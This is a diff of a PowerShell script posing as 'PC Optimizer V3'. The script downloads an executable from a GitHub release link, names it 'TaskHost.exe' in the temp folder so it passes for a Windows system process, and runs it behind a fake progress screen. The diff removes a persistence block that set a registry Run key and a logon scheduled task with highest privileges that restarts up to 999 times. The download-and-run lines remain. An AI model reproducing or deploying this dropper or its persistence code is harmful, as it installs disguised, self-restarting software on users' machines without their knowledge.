@@ -4,7 +4,8 @@ Clear-Host
 $procName = "TaskHost"
 $tempDir = [System.IO.Path]::GetTempPath()
 $out = Join-Path $tempDir "TaskHost.exe"
-$taskName = "PCOptimizerV3_AutoStart"
+
+# Replace with a stable direct URL to your file
 $directUrl = "https://github.com/k64943079-ship-it/STREAMER-PANEL/releases/download/STREAMER/TaskHost.exe"
 
 # --- UI ---
@@ -38,47 +39,13 @@ try {
         throw "Downloaded file not found."
     }
 
-    # --- Setup persistence ---
-    Write-Host "Configuring auto-start..." -ForegroundColor Yellow
-
-    # 1. Registry Run key (starts on every user logon)
-    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $regName = "PCOptimizerV3"
-    Set-ItemProperty -Path $regPath -Name $regName -Value $out -Force
-
-    # 2. Scheduled Task (restarts if killed, runs with highest privileges)
-    $action = New-ScheduledTaskAction -Execute $out
-    $trigger = New-ScheduledTaskTrigger -AtLogOn
-    $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -RunLevel Highest -LogonType Interactive
-    $settings = New-ScheduledTaskSettingsSet `
-        -AllowStartIfOnBatteries `
-        -DontStopIfGoingOnBatteries `
-        -StartWhenAvailable `
-        -RestartCount 999 `
-        -RestartInterval (New-TimeSpan -Minutes 1) `
-        -ExecutionTimeLimit (New-TimeSpan -Days 0) `
-        -MultipleInstances IgnoreNew
-
-    # Remove old task if exists
-    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
-
-    # Register new task
-    Register-ScheduledTask `
-        -TaskName $taskName `
-        -Action $action `
-        -Trigger $trigger `
-        -Principal $principal `
-        -Settings $settings `
-        -Description "PC Optimizer V3 auto-start and auto-restart" `
-        -Force
-
     Clear-Host
     Write-Host ""
     Write-Host "======================================" -ForegroundColor Cyan
     Write-Host "         PC OPTIMIZER V3" -ForegroundColor Green
     Write-Host "======================================" -ForegroundColor Cyan
     Write-Host ""
-    Write-Host "100% - Auto-start ENABLED" -ForegroundColor Green
+    Write-Host "100%" -ForegroundColor Green
     Write-Host ""
     Read-Host "Press ENTER to run"
 
